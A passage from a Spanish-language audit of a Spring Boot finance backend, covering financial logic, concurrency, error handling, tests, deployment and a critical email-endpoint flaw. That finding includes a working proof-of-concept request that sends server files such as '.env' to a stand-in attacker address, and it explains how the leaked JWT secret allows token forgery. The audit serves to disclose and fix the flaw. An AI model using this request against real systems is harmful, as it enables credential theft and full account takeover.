No se encontró. Ver §5: ningún Request acepta `id`, `userId`, `roles`, `status` propio ni campos derivados.

### El agujero
Todo lo anterior está bien hecho, y **el módulo de correo lo atraviesa**: expone al usuario autenticado la capacidad de leer archivos del servidor y de enviar correo en nombre del proyecto. Ver §19 #1.

---

## 11. Auditoría de lógica financiera

Cálculos concretos, verificados a mano contra el código.

### A. Ingresos
`amount` con `@DecimalMin("0.01")` → **monto 0 y monto negativo se rechazan con 400** en la validación del DTO, antes de llegar al servicio. `date` con `@PastOrPresent` → **fecha futura rechazada**. `create` acredita `currentBalance` (`IncomeService:58`). Filtros `from`/`to` en el listado. Ownership por `findByIdAndUserId`.
**Monto enorme:** `precision = 19, scale = 2` → tope 99.999.999.999.999.999,99. Un valor mayor produce un error de base, no un desbordamiento silencioso. Aceptable.
**Problema:** ver S-4. Borrar un ingreso ya comprometido es imposible y no hay PUT para corregirlo.

### B. Gastos
`@DecimalMin("0.01")`, categoría como enum (`ExpenseCategory`, no texto libre), `@PastOrPresent`.
**¿Puede hacerse un gasto con saldo insuficiente?** **No.** `ExpenseService.create:45` llama a `savingsService.debit` **antes** de guardar el gasto, y `debit` valida contra el **saldo disponible**, no el total (`SavingsService:70-76`). Mensaje: *"El monto supera tu saldo disponible de X. El dinero comprometido en metas no se puede gastar."* ✅
**¿Doble contabilización?** No. Cada movimiento toca `currentBalance` exactamente una vez, y `delete` lo revierte con `refund`. Verificado en `SavingsApiFlowTest`.

### C. Savings
`currentBalance` es **caché** sobre ingresos y gastos, no fuente de verdad, y lleva `@Version`. `committedAmount` se **deriva** de las metas IN_PROGRESS en cada lectura, nunca se almacena. `availableBalance = currentBalance − committedAmount`.
**Valores negativos:** imposibles por la vía normal —`debit` valida antes. **No existe un `@DecimalMin("0")` en `Savings.currentBalance`** (a diferencia de `TokenWallet.tokenBalance`), así que la garantía es solo de código, no de esquema. Asimetría menor, vale anotarla.

### D. Savings Goal — caso del prompt, resuelto
**Meta 5000, aportes 1000 + 2000 + 2000:**

| Aporte | `remaining` antes | Acumulado después | Progreso | Estado |
|---|---|---|---|---|
| 1000 | 5000 | 1000 | 20% | IN_PROGRESS |
| 2000 | 4000 | 3000 | 60% | IN_PROGRESS |
| 2000 | 2000 | 5000 | **100%** | **COMPLETED**, `completedAt` sellado |

`ContributionService:92` — `if (accumulated.compareTo(target) >= 0)` → **detecta el 100% exactamente en el tercer aporte.** ✅
- **Aporte > 0:** `@DecimalMin("0.01")`. ✅
- **Aporte que supera lo que falta:** rechazado con 400 (`:80`), así que el acumulado **nunca supera el objetivo** y el progreso nunca pasa de 100%. ✅
- **Aporte después de COMPLETED:** 400, *"Esta meta ya esta cumplida."* ✅
- **Aporte después de EXPIRED:** 400 con la fecha. `goalService.applyExpiration(goal)` se ejecuta **antes** de la comprobación de estado (`:69`), así que una meta vencida se marca al tocarla y no acepta el aporte. ✅
- **Doble recompensa:** `completedAt` se sella una sola vez y solo se entra al bloque desde IN_PROGRESS. **Pero: cumplir una meta no paga ninguna recompensa en fichas.** No hay doble pago porque no hay pago. La propuesta sugiere recompensar metas cumplidas; hoy no ocurre (ver §21).
- **Consistencia suma(contributions) vs `accumulatedAmount`:** las dos escrituras van en la misma transacción y el mismo método (`:91` y `:107`). No pueden divergir salvo por escritura directa en base.

### E. Token Wallet — el caso crítico del prompt
**Saldo 100, petición A gasta 80, petición B gasta 80, simultáneas. ¿Puede terminar en −60?**

**No.** Y la razón **no** es el `@DecimalMin("0")` —el prompt tiene razón en que Bean Validation no protege contra carreras. La razón es `@Version` en `TokenWallet` (`TokenWallet.java:57`):

1. A y B leen la misma fila, ambas con `version = 7`.
2. Ambas pasan la comprobación `balance.signum() < 0` (100 − 80 = 20 ≥ 0 en las dos).
3. A hace flush: `UPDATE token_wallets SET token_balance=20, version=8 WHERE id=? AND version=7` → 1 fila. Commit.
4. B hace flush: `... WHERE id=? AND version=7` → **0 filas** → Hibernate lanza `ObjectOptimisticLockingFailureException` → **rollback completo de B**.

Saldo final: **20**. No hay pérdida de actualización ni doble gasto. ✅ La defensa es real.

**Pero hay dos consecuencias, y una es un defecto:**
- **No existe handler para `ObjectOptimisticLockingFailureException`** en `GlobalExceptionHandler` (verificado: `grep -i "Optimistic"` → 0 resultados). Cae en el `@ExceptionHandler(Exception.class)` → el usuario recibe **500 "Ocurrio un error interno"**. Debería ser **409 Conflict** con un mensaje que invite a reintentar. Ver §19 #3.
- No hay reintento automático. La operación de B simplemente se pierde.

**Idempotencia del libro:** `UNIQUE(reason, reference_id)` en `token_transactions`, y `record` consulta `findByReasonAndReferenceId` antes de asentar (`:106-111`). Un reintento de la misma partida devuelve el movimiento original en vez de cobrar dos veces. ✅ **Salvo en órdenes, donde `referenceId` va en null** (S-2).

**Detalle ingenioso:** en `MinigameSessionService:96`, el cobro de la partida usa `referenceId = +sessionId` y la recompensa `referenceId = −sessionId`. Comparten motivo pero no par, así que ambos caben bajo el UNIQUE y los dos siguen apuntando a la misma partida. ✅

**`balanceAfter`** guarda el saldo resultante en cada asiento, lo que permite detectar una desviación leyendo **una sola fila** en vez de sumando el historial completo. Buena decisión de auditoría.

### F. Investment Portfolio
`UNIQUE(user_id)` → **no pueden existir dos carteras para el mismo usuario**, garantizado por esquema. Creación automática en el primer acceso vía `getOrCreate`. Sin escritura por API. `@Version` sobre `investedTokens` y `simulatedValue`, que son cachés.

### G. Portfolio Position — casos del prompt, resueltos
**Compra 10 @ 62.80, luego 10 @ 52.80:**
```
previousCost = 10 × 62.80 = 628.00
addedCost    = 10 × 52.80 = 528.00
newQuantity  = 20
averageCost  = (628.00 + 528.00) / 20 = 1156.00 / 20 = 57.80
```
`PortfolioService:128-134` → **cantidad = 20, costo promedio = 57.80.** ✅ **Exactamente el valor esperado.**

**Después, venta 5 @ 70:**
```
releasedCost   = 5 × 57.80 = 289.00
remaining      = 20 − 5 = 15
averageCost    = 57.80  ← NO SE MODIFICA
investedTokens = 1156.00 − 289.00 = 867.00
fichas acreditadas = 5 × 70 = 350.00
```
- **cantidad final: 15** ✅
- **costo promedio remanente: 57.80** ✅ — **la venta NO corrompe el costo promedio**, que era exactamente lo que el prompt pedía verificar. La razón está comentada en `PortfolioService:145-149`: de `investedTokens` se retira la parte proporcional **al coste medio**, no lo que se cobró por la venta. Si se restara el importe de la venta (350), vender con ganancia dejaría el invertido por debajo de lo que realmente queda puesto.
- **PnL no realizado:** 15 × 70 − 15 × 57.80 = 1050.00 − 867.00 = **+183.00** ✅, y coincide con el cálculo a nivel de cartera (`marketValue − investedTokens` = 1050 − 867 = 183). Los dos caminos dan el mismo número: son consistentes.
- **PnL realizado:** 5 × (70 − 57.80) = **+61.00**. El beneficio **sí** llega al monedero (se acreditan 350 fichas mientras solo se liberan 289 de invertido, neto +61). Pero **no se calcula, no se guarda y no se expone en ningún DTO.** Ver S-3.
- **Posición a cero:** se borra la fila (`:169-171`), en vez de dejar una con cantidad 0. Correcto.

### H. Trade Order
**Caso del prompt: BUY sin fichas suficientes. Debe: no modificar wallet, no modificar position, registrar REJECTED con motivo, devolver el status HTTP correcto.**

| Requisito | Resultado |
|---|---|
| No modificar wallet | ✅ `record` valida y lanza **antes** de mutar el saldo (`TokenWalletService:119`) |
| No modificar position | ✅ `applyBuy` nunca llega a ejecutarse |
| Registrar REJECTED con motivo | 🔴 **NO.** La transacción se aborta; no se guarda ninguna orden |
| Status HTTP correcto | 🔴 **NO. Devuelve 500.** Verificado en runtime |

**El orden de los pasos es correcto** (validaciones antes de tocar saldos, y en SELL se comprueba la posición antes de acreditar fichas), y **no hay transacción parcial**: el rollback es total. El defecto no es de lógica financiera, es transaccional. Detalle completo en §19 #2.

**Idempotencia:** `clientOrderId` con `UNIQUE`, consultado al entrar (`:81`). Con reintento secuencial funciona y está probado (`aRetriedOrderIsNotChargedTwice`: saldo 700 tras dos POST idénticos). Con reintento **simultáneo**, ambas ven vacío y la segunda choca con el UNIQUE → 409 en vez de devolver la orden original. Aceptable pero no es la idempotencia que el Javadoc promete.

### I. Cálculo de PnL — casos del prompt
**Compra 10 @ 50, precio actual 60:**  `marketValue = 600`, `costBasis = 10 × 50 = 500`, `unrealizedPnl = 600 − 500 = **+100**` ✅
**Mismo caso, precio actual 40:**  `marketValue = 400`, `costBasis = 500`, `unrealizedPnl = **−100**` ✅
Los signos son correctos en ambas direcciones y la fórmula es exacta, no aproximada: `PortfolioService:198-200`, sin redondeos intermedios salvo `setScale(2, HALF_UP)` al final.
**`realizedPnl`: no existe.** Ver S-3.

### J. Asset y Asset Quote
`symbol` con `UNIQUE` (`uk_assets_symbol`) ✅. `currency` con `@Pattern("^[A-Z]{3}$")` ✅. `type` como enum ✅. Precio con `precision 19, scale 4` —cuatro decimales, adecuado para cotizaciones ✅. `active` para desactivación lógica ✅.
- **Sin quote:** `requireQuote` lanza 400 con mensaje claro. Es 400 y no 404 porque el activo existe; lo que falta es un dato que el sistema no cargó. Justificado. ✅
- **Quote null:** imposible, `@NotNull` + `optional = false`.
- **Precio negativo o cero:** rechazado dos veces, en `@DecimalMin(inclusive=false)` y en `AssetService:178`. ✅
- **Quote desactualizada:** **no se comprueba.** Ver S-5.
- **El precio cambia mientras llega una orden:** la orden lee la cotización dentro de su transacción y **guarda `executionPrice` y `tokenRate` en la fila**, así que la orden es reproducible aunque el precio cambie después. ✅ Decisión correcta.

### K. Projection — tres casos verificados a mano
`annualRate` se almacena como **decimal**, no porcentaje (`precision 7, scale 6` → máximo 9.999999). `monthlyRate = annualRate / 12`.

**Caso 1 — capital 1000, aporte 0, tasa 0.12, 12 periodos:**
- Simple: `1000 × (1 + 0.01 × 12) = 1000 × 1.12 = **1120.00**` ✅ (interés simple: 1000 + 1000×0.12×1año)
- Compuesto: `1000 × 1.01^12 = 1000 × 1.126825 = **1126.83**` ✅
- Diferencia: 6.83

**Caso 2 — capital 0, aporte mensual 100, tasa 0.12, 12 periodos:**
- Compuesto: `100 × (1.01^12 − 1) / 0.01 = 100 × 12.6825 = **1268.25**` ✅ — es la fórmula estándar de valor futuro de una anualidad ordinaria (pagos a fin de periodo).
- Simple: `100 × 12 + 100 × 0.01 × accruedMonths`, con `accruedMonths = 12 × 11 / 2 = 66` → `1200 + 66 = **1266.00**` ✅ — el depósito k-ésimo gana interés durante (12−k) meses, y la suma de esos meses es 66. **La convención de anualidad ordinaria es la misma en las dos fórmulas**, así que simple y compuesto son comparables entre sí. Eso es lo que hace que `difference` signifique algo.

**Caso 3 — tasa 0, capital 1000, aporte 100, 12 periodos:**
- Compuesto: rama especial de `:104`, `1000 + 100 × 12 = **2200.00**`
- Simple: `1000 × 1 + 1200 + 0 = **2200.00**` ✅
- **Los dos coinciden, y no hay división por cero.** El `if (monthlyRate.signum() == 0)` existe precisamente porque `(growth − 1) / monthlyRate` sería 0/0. ✅

**Controles adicionales:** `MathContext` explícito en cada operación, `RoundingMode.HALF_UP` solo al final, `BigDecimal` en todo el cálculo (nunca `double`), `@Min(1) @Max(600)` en `periods` —así que `periods = 0` es imposible y el `(periods × (periods−1)) / 2` no se evalúa con valores degenerados.
**La matemática de proyecciones es correcta.** ✅

### L. Minigame
Score en el body, topado a 100 (`PERFECT_SCORE`); recompensa `maxTokenReward × min(score,100) / 100` con `RoundingMode.DOWN` —redondea a favor del sistema, no del usuario. Coste cobrado **antes** de la recompensa, así que jugar sin fichas da 400 y la partida no se registra (probado, `playingWithoutTokensIsRejected`). Coste y recompensa **se copian a la fila de la partida** en vez de leerse del catálogo al consultar: sin esa copia, editar el catálogo reescribiría el historial. ✅ Sesión con ownership (`findByIdAndUserId`). Solo juegos PUBLISHED son jugables (`findPublished`); un juego archivado no acepta partidas. ✅
`@Min(0)` en score sin `@Max`: intencional, el tope está en el servicio.

### M. Refresh Token
Ya cubierto en §10. Hash no token plano ✅, expiración ✅, revocación ✅, rotación ✅, detección de reutilización con revocación de familia ✅, múltiples sesiones soportadas (1:N) ✅, logout público para que un token expirado pueda cerrar sesión ✅.

---

## 12. Auditoría de transacciones y concurrencia

### Transacciones
Todos los servicios usan `@Transactional`, con `readOnly = true` en las lecturas puras. Los tres flujos multi-tabla que el prompt señala:

| Flujo | Tablas escritas | Atómico | Evidencia |
|---|---|---|---|
| `TradeOrder` → `TokenWallet` → `TokenTransaction` → `PortfolioPosition` → `InvestmentPortfolio` → `orders` | 5 | ✅ sí, un solo `@Transactional` en `place` | pero ver #2: el rollback ocurre **cuando no debería** |
| `Contribution` → `SavingsGoal` → `savings_goal_contributions` | 2 | ✅ `ContributionService.create` | `@Version` en la meta |
| `MinigameSession` → `TokenWallet` → `TokenTransaction` (×2) | 3 | ✅ `MinigameSessionService.play` | la sesión se inserta primero y el rollback la deshace |

**"¿Qué ocurre si falla la tercera escritura?"** En los tres flujos, rollback completo: ninguno captura excepciones a mitad de camino… **excepto `TradeOrderService.place`, que sí lo hace, y ahí está el bug.**

**Registro de usuario:** `AuthService.register` crea el `User`. **No crea monedero, ahorro ni cartera**: los tres se crean de forma diferida en el primer acceso, vía `getOrCreate`. Es una decisión válida (menos escrituras en el registro, y el UNIQUE impide duplicados) con el coste de S-7.

### Concurrencia
`@Version` está en las cuatro entidades que acumulan saldo: `Savings`, `TokenWallet`, `SavingsGoal`, `InvestmentPortfolio`. No hay bloqueo pesimista ni `SELECT FOR UPDATE`, y a esta escala no hacen falta.

| Escenario del prompt | Puede haber pérdida de actualización | Por qué |
|---|---|---|
| Dos compras simultáneas | **No** | `@Version` en `TokenWallet` e `InvestmentPortfolio` |
| Dos gastos simultáneos | **No** | `@Version` en `Savings` |
| Dos recompensas simultáneas | **No** | `@Version` + `UNIQUE(reason, reference_id)` |
| Dos refresh simultáneos | **No** | `UNIQUE(token_hash)` + revocación de familia al detectar reutilización |
| Dos aportes simultáneos a una meta | **No** | `@Version` en `SavingsGoal` |
| Dos órdenes con el mismo `clientOrderId` | **No** se duplican | `UNIQUE(client_order_id)`, pero la segunda recibe 409 en vez de la orden original |
| Primer acceso simultáneo del mismo usuario | **No** se duplica el monedero | `UNIQUE(user_id)`, pero una petición recibe 409 (S-7) |

**Doble gasto: imposible. Doble recompensa: imposible. Orden duplicada: imposible. Saldo negativo: imposible.**

**El defecto de concurrencia no es la protección, es la respuesta:** los siete escenarios se defienden correctamente a nivel de datos, y **cuatro de ellos devuelven 500 al usuario** porque falta el handler de `ObjectOptimisticLockingFailureException`. La integridad está a salvo; la experiencia y el contrato HTTP no.

**INFERENCIA, no hecho:** este análisis es de código y de configuración de locking. No se ejecutaron peticiones concurrentes reales en esta auditoría.

---

## 13. Auditoría de excepciones

**Jerarquía:** `ApiException extends RuntimeException`, abstracta, **portando su propio `HttpStatus`**. Seis subclases: `ResourceNotFoundException` (404), `DuplicateResourceException` (409), `InvalidRequestException` (400), `ForbiddenException` (403), `UnauthenticatedException` (401), `EmailSenderException` (502).

La decisión de que el status viaje **en la excepción** y no en un `Map<Class, HttpStatus>` dentro del handler es la correcta, y está justificada en el Javadoc: con el mapa, añadir una excepción nueva sin tocar el mapa devuelve 500 en silencio. Aquí una subclase nueva funciona sin modificar el handler.

**Handler global:** `@RestControllerAdvice` con **22 `@ExceptionHandler`**, que es una cobertura muy por encima de lo habitual. Incluye casos que casi nadie cubre: `HandlerMethodValidationException` (400), `HttpMediaTypeNotSupportedException` (415), `HttpMediaTypeNotAcceptableException` (406), `MissingRequestHeaderException` (400), `ResponseStatusException` (respeta su propio status), `TaskRejectedException` (503) y **`MissingPathVariableException` → 500**, que es correcto: una plantilla de ruta mal escrita es un bug del servidor, no del cliente.

**Formato:** `ErrorResponseDTO(timestamp, status, error, message, path, fieldErrors)` — los cinco campos exigidos, más los errores de campo. El `@JsonInclude(NON_EMPTY)` está **en el componente `fieldErrors`, no a nivel de tipo**, que es lo correcto: a nivel de tipo también borraría `message` cuando viniera vacío.

**Verificado en la corrida real:** ningún endpoint devuelve `null`, ni un stack trace, ni una excepción genérica al cliente. El catch-all devuelve *"Ocurrio un error interno. Intentalo de nuevo mas tarde."* y registra el detalle solo en el log.

**Cobertura por código:** 400 ✅ 401 ✅ 403 ✅ 404 ✅ 409 ✅ 500 ✅ — los seis, con tests en `GlobalExceptionHandlerTest` y `GlobalExceptionHandlerWiringTest`.

**Las tres lagunas:**

| # | Excepción | Hoy | Debería | Cuándo se dispara |
|---|---|---|---|---|
| E-1 | `ObjectOptimisticLockingFailureException` | **500** | **409** | Cada vez que el locking optimista hace su trabajo. Es el resultado esperado de dos operaciones simultáneas, no un fallo interno |
| E-2 | `UnexpectedRollbackException` | **500** | no debería llegar nunca | Ver §19 #2 |
| E-3 | `MaxUploadSizeExceededException` | **500** | **413** | Al subir un adjunto mayor que el límite. Hoy es teórico porque el endpoint de adjuntos recibe rutas, no ficheros; se vuelve real en cuanto se aplique el fix de #28 |

**Un 500 para un error de negocio es exactamente lo que la rúbrica penaliza en el criterio 4.2**, y aquí ocurre en dos sitios (E-1 y E-2).

---

## 14. Auditoría de REST

**Bien:** prefijo `/api/v1` centralizado; sustantivos en plural; anidamiento correcto en `savings-goals/{goalId}/contributions`; `@Valid` en los 14 `@RequestBody` relevantes (falta en uno, ver abajo); cabecera `Location` en los 201; `ResponseEntity` tipado en los 47 endpoints; enums en lugar de strings libres; filtros por `@RequestParam` en `incomes` y `expenses`; `DELETE` idempotente.

**Códigos:** `POST → 201` ✅ (con `Location`), `DELETE → 204` ✅ (salvo `/orders/{id}`), `GET → 200` ✅, `POST /sendMail → 202` ✅ (correcto para asíncrono), errores 400/401/403/404/409 ✅.

**No se usa 422** en ningún sitio. Está bien: la rúbrica no lo exige y 400 con `fieldErrors` es más simple y más común.

**Se usa 503** para `TaskRejectedException` (cola de async saturada). Es consistente y justificable: el servidor no puede atender ahora, reintente. ✅

**Problemas:**

| # | Problema | Severidad |
|---|---|---|
| R-1 | `EmailController` sin `@RequestMapping`; rutas con verbo (`/sendMail`, `/sendEmailWithAttatchment`, con typo en "Attatchment"); devuelve `String` crudo (`"Mail queued"`) en vez de un DTO; **sin `@Valid` en el endpoint de adjuntos** (`EmailController.java:41`) | MEDIO |
| R-2 | `DELETE /orders/{id}` no borra: cancela, y devuelve cuerpo. Debería ser `POST /orders/{id}/cancel` → 200, o `PATCH` | MEDIO |
| R-3 | `GET /assets/all` y `GET /minigames/all`: `all` es un segmento de ruta donde debería ser un parámetro (`?includeInactive=true`) | BAJO |
| R-4 | **Ningún endpoint pagina.** `GET /incomes`, `/expenses`, `/orders`, `/token-wallet/transactions` devuelven la colección completa. Con un año de uso, `transactions` son cientos de filas por petición | MEDIO (y es un punto de bonus perdido) |

---

## 15. Auditoría de eventos / async / email

### Eventos — 🔴 NO CUMPLE
```
grep -rn "publishEvent|@EventListener|@TransactionalEventListener|ApplicationEvent" src/main/java
→ 0 resultados
```
**No existe ningún evento de aplicación en el proyecto.** El issue #10 ("Event Listening Architecture") sigue abierto. Es **1.0 punto de rúbrica perdido en su totalidad**, y es el punto más barato de recuperar de todo el informe: los dos ganchos naturales ya están escritos y localizados —la transición a `COMPLETED` en `ContributionService:93` y el `EXECUTED` en `TradeOrderService:117`.

Al implementarlo, usar `@TransactionalEventListener(phase = AFTER_COMMIT)`. Un `@EventListener` normal se ejecuta **dentro** de la transacción, así que enviaría el correo de "meta cumplida" antes del commit —y lo enviaría igual si el commit acabara en rollback. Es el error que el prompt pide buscar, y conviene no cometerlo al añadirlo.

### Async — ✅ COMPLETO
`@EnableAsync` en `CheckOutApplication:8`. `AsyncConfig` declara un `mailExecutor` dedicado (core 2, max 5, cola 100) con prefijo de hilo `mail-`, en vez de usar el `SimpleAsyncTaskExecutor` por defecto, que crea un hilo nuevo por tarea sin límite. Implementa `AsyncConfigurer` con `AsyncUncaughtExceptionHandler`.

**No hay self-invocation.** `@Async` está en `EmailServiceImplemented`, y quien lo llama es `EmailController` a través de la interfaz `EmailService`, es decir a través del proxy. El async funciona de verdad; el log de la sonda lo confirma: la petición devuelve 202 desde el hilo `main` mientras el envío ocurre en `mail-1`.

**Observación (INFERENCIA, bajo):** el `AsyncUncaughtExceptionHandler` de `AsyncConfig:28` **nunca se dispara**, porque los métodos `@Async` devuelven `CompletableFuture`: Spring deposita la excepción en el future en vez de considerarla "uncaught". Quien realmente maneja el fallo es el `.whenComplete(...)` del controller, que delega en `AsyncFailureHandler`. El handler de `AsyncConfig` es código muerto —correcto tenerlo por si se añade un `@Async void`, pero no es lo que protege hoy.

### Email — 🟡 PARCIAL
Funciona: SMTP real, asíncrono, 202, adjuntos, `EmailSenderException` → 502. Y es explotable por cualquier usuario autenticado. Ver §19 #1.

---

## 16. Auditoría de tests

**Ejecutados: 185 tests, 0 fallos, 0 errores, BUILD SUCCESS** en 46 s.

| Clase | Tests | Qué cubre de verdad |
|---|---|---|
| `AuthenticationFlowTest` | 23 | register, login, JWT, refresh con rotación, reutilización de refresh, logout, roles |
| `SavingsApiFlowTest` | 19 | ciclo completo ingresos/gastos/metas/aportes, ownership, sobre virtual |
| `RemainingModulesApiTest` | ~40 | monedero sin escritura, catálogo solo-ADMIN, score manipulado, órdenes, idempotencia |
| `GlobalExceptionHandlerTest` + `WiringTest` | ~35 | los 22 handlers contra el contexto real de Spring |
| `DtoValidationTest` | ~20 | validaciones de los Request |
| `EntityMappingTest` | ~15 | mapeos JPA y constraints |
| `MapperConfigTest` | ~10 | estrategia STRICT y derivados en null |
| `ConfigurationContractTest` | ~5 | contrato `.env.example` ↔ `application.properties` |
| `ErrorResponseDTOTest` | ~8 | serialización, incluido el caso del `@JsonInclude` |
| `CheckOutApplicationTests` | 1 | arranque del contexto |

**Lo que está bien:** son mayoritariamente tests de integración con `@SpringBootTest` y la cadena de seguridad **real**, con tokens JWT de verdad, no con un doble de `CurrentUserProvider`. Eso es lo que hace que los `@PreAuthorize` se ejecuten realmente. La lista de prioridades del prompt está cubierta en 14 de 16 puntos: login ✅ register ✅ JWT ✅ refresh ✅ roles ✅ ownership ✅ CRUD ✅ DTO inválido ✅ email duplicado ✅ `clientOrderId` duplicado ✅ fichas insuficientes ✅ orden rechazada ✅(pero ver abajo) costo promedio ✅ completado de meta ✅ duplicación de recompensa ✅. Falta **PnL** y falta **concurrencia**.

**El problema serio de la suite, y es el que dejó pasar el crítico #2:**

`RemainingModulesApiTest`, `SavingsApiFlowTest` y `AuthenticationFlowTest` llevan **`@Transactional` a nivel de clase** (`RemainingModulesApiTest.java:45`). Eso hace que **el método de test sea el dueño de la transacción externa**, y que los `@Transactional` de los servicios se unan a ella como transacciones participantes. La consecuencia es que **la suite no reproduce los límites transaccionales de producción**: en producción, `TradeOrderService.place` **es** la transacción externa, y la semántica de rollback de una transacción participante fallida sí se aplica.

Prueba: `anUnaffordableOrderIsRecordedAsRejected` pasa en verde dentro de la suite y **falla con 500** en cuanto se le quita el `@Transactional` de clase. Verificado con una sonda desechable (§19 #2).

**Recomendación:** mantener `@Transactional` en los tests de lectura y de validación, donde el aislamiento entre tests vale más, y **quitarlo en los tests de flujos financieros de escritura**, limpiando con `@Sql` o con `deleteAll` en `@AfterEach`. Son los flujos donde la transacción **es** el comportamiento que se está probando, y envolverlos en otra transacción esconde precisamente lo que hay que verificar.

**Código crítico sin test:** cálculo de PnL, `realizedPnl`, concurrencia (ninguna), `ObjectOptimisticLockingFailureException`, y los dos endpoints de correo (cero tests en `main` —los 7 que existen viven en el PR #28 que no se mergeó).

---

## 17. Auditoría de deployment

| Elemento | Estado | Evidencia |
|---|---|---|
| Dockerfile | 🔴 **NO EXISTE** | `ls Dockerfile*` → no such file |
| Imagen de la aplicación | 🔴 no hay | consecuencia del anterior |
| `compose.yaml` | 🟡 existe pero **solo levanta PostgreSQL** | un único servicio `postgres:16-alpine`; la aplicación no está en el compose |
| Variables de entorno | ✅ correcto | todo desde `${VAR}`, `.env.example` documentado y **verificado por test** |
| PostgreSQL | ✅ configurado | `postgres:16-alpine`, healthcheck con `pg_isready`, volumen con nombre, puerto 5433 en el host para no chocar con un PostgreSQL local |
| Profiles | 🔴 no hay | ni `application-dev.properties` ni `application-prod.properties` |
| Despliegue en AWS (ECS/EC2 + RDS) | 🔴 **no existe** | issue #15 abierto |
| Despliegue en PaaS (Railway/Render) | 🔴 no existe | — |
| Secretos | ✅ correcto | `.env` y `.env.*` en `.gitignore`; test que falla si aparece una credencial hardcodeada |

**No se asumió despliegue por la existencia de un compose: se comprobó, y no hay nada despegable.** Rúbrica 8 = **0.0 / 2.0**. Es la pérdida individual más grande del proyecto.

**Y hay dos defectos de configuración que harían fallar el despliegue el día que exista:**

| # | Archivo | Problema | Impacto |
|---|---|---|---|
| D-1 | `application.properties:5` | `spring.jpa.hibernate.ddl-auto=${DDL_AUTO:create-drop}` | El **default es `create-drop`**: si `DDL_AUTO` no se fija en producción, **la base se borra completa en cada reinicio del contenedor**. En un despliegue en ECS, donde los reinicios son rutinarios, esto es pérdida total de datos. El default debería ser `validate` |
| D-2 | `application.properties:6` | `spring.jpa.show-sql=${SHOW_SQL:true}` | Con el default, producción registra **cada sentencia SQL**, con sus parámetros. Ruido y fuga de datos en los logs. El default debería ser `false` |

Los dos son un cambio de una palabra cada uno, y los dos son de los que solo se descubren en producción.

---

## 18. Auditoría GitHub / documentación

| Elemento | Estado | Evidencia |
|---|---|---|
| README | 🔴 **una línea: `// TODO`** | `wc -l README.md` → 1 |
| Historial de Git | ✅ bueno | 41 commits en `main`, **todos vía pull request**, mensajes con prefijo convencional (`feat(api):`, `fix(models):`, `ci:`, `build:`) |
| Ramas | ✅ bien nombradas | `feature/N-descripcion`, `fix/descripcion`, `ci/descripcion` |
| Colaboración | ✅ real | 6 identidades de autor: Ary-San (26), Alba (12 en dos identidades), Angel64123, Ghasttley, Miguel Angel Flores Cardenas |
| CI | ✅ existe y corre | `.github/workflows/build.yml`, en cada PR y en cada push a `main`, con JDK 21, caché de Maven y `chmod +x mvnw` (el bit de ejecución se perdió al commitear desde Windows) |
| Issues | 🟡 bien escritos, mal mantenidos | 16 issues, numerados y alineados con la rúbrica; **7 siguen abiertos con su código ya mergeado en `main`**: #4, #5, #6, #7, #8, #9, #11 |
| `.gitignore` | ✅ correcto | excluye `.env`, `target/`, IDE, y admite `.env.example` |
| Swagger / OpenAPI | ✅ activo | SpringDoc responde en `/v3/api-docs` y `/swagger-ui.html`, y están en `PUBLIC_PATHS`. **Aviso:** quedan públicos también en producción; conviene `springdoc.api-docs.enabled=${SWAGGER_ENABLED:false}` |

**El README es el defecto de documentación más visible del proyecto.** Es lo primero que abre quien evalúa, vale 0.4 puntos directos, y hoy dice `// TODO` sobre un backend de 150 clases con seguridad JWT completa. Es la peor relación esfuerzo/beneficio de la lista.

**Los 7 issues abiertos** dan la impresión contraria a la realidad: que #5 a #9 (toda la seguridad) están sin hacer, cuando están implementados y probados. Cerrarlos con un comentario que apunte al PR es trabajo de diez minutos y afecta al criterio 9.3.

---

## 19. Errores críticos encontrados

### ERROR CRÍTICO #1 — Un usuario cualquiera puede leer archivos del servidor y enviar correo en nombre del proyecto

**Archivos:**
- `src/main/java/com/checkout/backend/email/EmailDetails.java:12,15`
- `src/main/java/com/checkout/backend/email/EmailServiceImplemented.java:56,66,70-71`
- `src/main/java/com/checkout/backend/email/EmailController.java:41`

**Problema.** Son dos vulnerabilidades en el mismo DTO.

*(a) Lectura arbitraria de archivos.* `EmailDetails.attachment` es un `String` que el cliente envía, y `EmailServiceImplemented:56` lo usa tal cual:
```java
File attachment = new File(details.getAttachment());
...
FileSystemResource file = new FileSystemResource(attachment);
helper.addAttachment(file.getFilename(), file);
```
Cualquier ruta legible por el proceso de la JVM se adjunta y se envía. Sin normalización, sin lista blanca, sin directorio base, sin comprobación de `..`.

*(b) Relay abierto.* `EmailDetails.recipient` también viene del cliente, y `:66` hace `helper.setTo(details.getRecipient())` con `setFrom(sender)`, la cuenta de Gmail del proyecto. El backend envía a quien le digan, firmado por el proyecto.

**Cómo reproducirlo.** Verificado en ejecución real, no inferido. Sonda: registrar un usuario nuevo por el endpoint público y, con su access token, un solo POST:
```http
POST /api/v1/sendEmailWithAttatchment
Authorization: Bearer <token de un usuario recién registrado>
Content-Type: application/json

{"recipient":"atacante@evil.example","subject":"x","msgBody":"x","attachment":"pom.xml"}
```
Respuesta: **202 Accepted**. Captura del `MimeMessage` que llegó al `JavaMailSender`:
```
recipients = [atacante@evil.example]
from       = [checkout@utec.edu.pe]
part 0 fileName=null    type=text/plain
part 1 fileName=pom.xml type=text/plain    ← el archivo del servidor, adjunto
```
Con `"attachment":".env"` el adjunto es el archivo de variables de entorno: credenciales de base de datos, `JWT_SECRET` y la contraseña de la cuenta de correo. Con `JWT_SECRET` en su poder, el atacante **firma tokens con el rol que quiera** y el sistema los acepta como legítimos, porque son legítimos.

**Por qué ocurre.** El DTO de entrada acepta dos campos que un DTO de entrada no puede aceptar: uno que designa un recurso del servidor y otro que designa un destinatario. El endpoint de adjuntos además no lleva `@Valid` (`EmailController.java:41`), así que ni las validaciones declaradas se ejecutan.

**Impacto.** Escalada de privilegios total (vía `JWT_SECRET`) + fuga de credenciales + uso del dominio del proyecto para enviar correo arbitrario. Es la única vulnerabilidad del proyecto que compromete el sistema completo, y el resto de la seguridad —que está bien hecha— no sirve de nada mientras siga ahí.

**Corrección recomendada.** **Ya está escrita.** Es el PR #28, que se mergeó contra `feature/4-rest-controllers` 28 segundos tarde y nunca llegó a `main`:
- el destinatario sale del token, no del body;
- el adjunto se sube por multipart como `MultipartFile` (nunca una ruta), con límite de 5 MB y nombre de archivo saneado;
- `EmailRequest` público con solo `subject` y `body`, y `EmailDetails` interno;
- inyección por constructor, `MailConfig` eliminado, rutas normalizadas a `/emails` y `/emails/with-attachment`;
- 7 tests de seguridad.

